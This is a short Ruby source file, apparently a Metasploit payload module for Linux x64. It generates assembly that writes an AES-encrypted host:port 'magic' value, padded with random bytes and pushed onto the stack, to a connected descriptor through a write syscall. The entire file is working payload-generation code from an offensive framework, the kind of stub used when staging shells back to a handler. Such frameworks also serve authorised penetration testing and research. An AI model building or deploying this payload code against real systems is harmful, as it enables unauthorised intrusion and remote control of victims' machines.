# -*- coding: binary -*-

module Msf
  module Payload::Linux::SendMagicX64
    include Rex::Crypto

    def asm_send_magic(opts = {})
      iconn = opts[:ihost]
      iconn += ':'
      iconn += opts[:iport]
      n = rand(9...50)
      r = Random.new.bytes(n - n % 8)

      magic = r
      magic += Aes256.encrypt_aes256(opts[:iv], opts[:key], iconn)

      asm = %^
        send_magic:
          xor    rax, rax
          mov    al, 0x01
        ^
      magic.reverse.bytes.each_slice(8) do |word|
        asm << %^
          mov rbx, 0x#{word.pack('C*').unpack('H*')[0]}
          push   rbx
        ^
      end

      asm << %^
          mov    dl, 0x#{'%02x' % magic.length}
          xor    rdi, rdi
          mov    rsi, rsp
          syscall
          xor    rdx, rdx
          xor    rsi, rsi
        ^
      asm
    end
  end
end
